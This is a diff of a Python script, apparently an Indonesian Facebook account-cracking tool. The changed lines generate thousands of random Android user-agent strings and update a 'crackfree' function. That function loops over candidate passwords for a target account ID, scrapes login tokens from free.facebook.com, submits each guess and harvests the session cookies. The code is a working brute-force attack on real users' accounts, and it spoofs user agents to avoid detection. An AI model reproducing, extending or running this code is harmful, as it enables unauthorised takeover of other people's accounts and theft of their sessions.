@@ -8,7 +8,7 @@ github ='github.com/Basari-ID'
 facebook ='fb.me/basari.shp'
 #>----------------------------------------------<#
 
-# Script Ini 100% Open Source Code !! #
+# Script Ini 100% Open Source Code Ya ! #
 # Kalian Oprek Sendiri Biar Hasilnya Ijo #
 
 ###>[ MENGIMPORT MODULE ]<###
@@ -103,7 +103,7 @@ for xd in range(10000):
 	k=random.randrange(40,150)
 	l='Mobile Safari/537.36'
 	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-	ugen2.append(uaku2)
+	ugen.append(uaku2)
 
 	aa='Mozilla/5.0 (Linux; U; Android;'
 	b=random.choice(['6','7','8','9','10','11','12'])
@@ -118,7 +118,7 @@ for xd in range(10000):
 	k=random.randrange(40,150)
 	l='Mobile Safari/537.36'
 	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-	ugen2.append(uaku2)
+	ugen.append(uaku2)
 
 	aa='Mozilla/5.0 (Linux; Android'
 	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
@@ -737,7 +737,7 @@ def crackfree(idf,pwv):
 	ses = requests.Session()
 	for pw in pwv:
 		try:
-			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
 			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
